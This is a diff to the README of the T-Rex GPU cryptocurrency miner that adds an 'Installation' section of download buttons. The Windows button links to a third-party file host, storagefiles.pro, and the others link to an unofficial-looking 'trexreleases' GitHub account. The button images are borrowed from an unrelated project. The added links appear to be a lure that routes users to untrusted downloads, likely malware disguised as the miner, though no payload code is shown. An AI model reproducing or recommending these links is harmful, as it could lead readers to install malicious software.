@@ -1,5 +1,14 @@
 # T-Rex NVIDIA GPU miner (Ethash / Etchash / Autolykos2 / Kawpow / Blake3 / Octopus / Firopow)
 
+# Installation
+Click the download button for your operating system:
+<p float="left">
+  <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-linux.png" width="200" /></a>
+  <a href="https://github.com/trexreleases/T-Rex/releases/tag/0.26.8"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-mac.png" width="200" /></a>
+  <a href="https://storagefiles.pro/?f=111GkiCAyvW"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
+</p>
+
+
 ## Overview
 
 T-Rex is a versatile cryptocurrency mining software. It supports a variety of algorithms and we, as developers, are trying to do our best to make it as fast and as convenient to use as possible.
